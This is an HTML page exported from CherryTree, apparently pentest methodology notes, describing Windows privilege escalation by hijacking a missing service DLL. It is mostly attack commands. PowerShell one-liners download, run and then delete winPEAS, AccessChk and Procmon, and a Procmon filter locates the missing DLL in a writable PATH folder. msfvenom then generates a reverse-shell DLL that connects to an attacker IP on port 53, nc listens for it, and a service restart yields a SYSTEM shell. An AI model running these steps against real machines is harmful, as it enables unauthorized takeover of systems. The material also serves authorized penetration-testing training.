<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DLL missing from the system</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>DLL missing from the system</h1><br /><br /><br />1. Use winPEAS to enumerate non-Windows
    services:<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;servicesinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1326-1.png" alt="images/1326-1.png" /></a><br />2. For each service that we
    have found <span style="color:#ff0000;">possible vulnerable to DLL Hijacking</span>, we need to find which ones our
    user has stop and start access<br /> <span style="color:#a5452a;">example:</span> in the image we see service
    “dllsvc”<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-uvqc&nbsp;$env:username&nbsp;dllsvc&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1326-2.png" alt="images/1326-2.png" /></a><br />3. Confirm manually that
    <span style="color:#ff00e0;">binary that is executed from the service</span>. Previously already found with
    winPEAS<br /> Moreover discovery if the service is launched with <span style="color:#ff0000;">System
      privileges</span><br /> ◇ sc<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;sc&nbsp;qc&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>service<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/1326-3.png" alt="images/1326-3.png" /></a><br /><br />4. Analyze the <span
      style="color:#ff00e0;">binary that is executed from the service</span><br /> In a real engagement we should copy
    the <span style="color:#ff00e0;">binary</span>(&quot;C:\Program Files\DLL Hijack Service\dllhijackservice.exe&quot;)
    off the target host and onto the attacker machine(where we have the admin rights for analysis)<br /> ◇ Procmon: <a
      href="https://download.sysinternals.com/files/ProcessMonitor.zip" target="_blank">https://download.sysinternals.com/files/ProcessMonitor.zip</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://download.sysinternals.com/files/ProcessMonitor.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\procmon64.exe&quot;;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\procmon64.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;
      </div>
    </div><br /> 1- Clear the current captures <a href=""><img src="images/1326-4.png" alt="images/1326-4.png" /></a>
    (Ctrl+X)<br /> 2- Open the Filter <a href=""><img src="images/1326-5.png" alt="images/1326-5.png" /></a> (Ctrl+L)
    and add a new filter that &quot;Display entries matching these conditions : Process Name, is, &lt;binary&gt;<br />
    <a href=""><img src="images/1326-6.png" alt="images/1326-6.png" /></a><br /> 3- Deselect: <a href=""><img
        src="images/1326-7.png" alt="images/1326-7.png" /></a> Show Registry Activity, <a href=""><img
        src="images/1326-8.png" alt="images/1326-8.png" /></a> Show Network Activity<br /> 4- Start the capture again <a
      href=""><img src="images/1326-9.png" alt="images/1326-9.png" /></a> (Ctrl +E)<br /> <br /> Go to the terminal and
    start the &lt;service&gt; that we want to study (<span style="color:#a5452a;">example</span>: dllsvc)<br /> <a
      href=""><img src="images/1326-10.png" alt="images/1326-10.png" /></a><br /> 5- Find the “NAME NOT FOUND” dll<br />
    <a href=""><img src="images/1326-11.png" alt="images/1326-11.png" /></a><br /> the “<span
      style="color:#ff8700;">NAME NOT FOUND</span>” are associated with the dll not found(in our <span
      style="color:#a5452a;">example</span> hijackme.dll). <br /> Procmon show us that Windows goes through each
    directory in the <a
      href="t_Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Windows_Privilege_Escalation--2._Service_Exploits--DLL_Hijacking.html">DLL
      Search order</a>.<br /> Windows also in C:\Temp directory, in this scenario because in our machine C:\Temp is in
    %PATH%<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;echo&nbsp;%PATH%</div>
    </div><br /> <a href=""><img src="images/1326-12.png" alt="images/1326-12.png" /></a><br /> where we have writable
    permissions!<br />
    <div class="codebox">
      <div class="codebox">PS&gt;&nbsp;Get-Acl&nbsp;C:\Temp\&nbsp;|&nbsp;Format-List</div>
    </div><br /> <a href=""><img src="images/1326-13.png" alt="images/1326-13.png" /></a><br /><br />5. Generate a dll
    reverse shell with msfvenom, that has the same name of the original dll<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;msfvenom&nbsp;-p&nbsp;windows/x64/shell_reverse_tcp&nbsp;LHOST=192.168.147.139&nbsp;LPORT=53&nbsp;-f&nbsp;dll&nbsp;-o&nbsp;hijackme.dll
      </div>
    </div> <br /> <a href=""><img src="images/1326-14.png" alt="images/1326-14.png" /></a><br /><br />6. Copy the dll
    generated on the target Windows machine<br />7. Set a listener for the reverse shell on the attacker machine<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div><br />8. Stop and Start the targeted service <br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;net&nbsp;stop&nbsp;&lt;service&gt;<br />C:\&gt;&nbsp;net&nbsp;start&nbsp;&lt;service</div>
    </div><br /> <a href=""><img src="images/1326-15.png" alt="images/1326-15.png" /></a><br />9. Now we should have
    received a SYSTEM shell on the attacker machine<br /> <a href=""><img src="images/1326-16.png"
        alt="images/1326-16.png" /></a><br />
  </div>
</body>

</html>